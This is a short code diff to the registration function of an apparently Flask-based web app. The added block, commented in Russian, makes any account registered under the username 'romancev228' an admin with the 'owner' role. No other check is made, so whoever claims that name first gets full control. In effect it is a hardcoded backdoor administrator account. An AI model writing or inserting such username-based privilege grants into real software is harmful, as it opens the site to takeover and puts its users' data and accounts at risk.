@@ -1052,6 +1052,12 @@ def register():
         user.set_password(password)
         db.session.add(user)
         db.session.commit()
+
+        # Назначаем owner если это romancev228
+        if username == 'romancev228':
+            user.is_admin = True
+            user.admin_role = 'owner'
+            db.session.commit()
         
         session['user_id'] = user.id
 
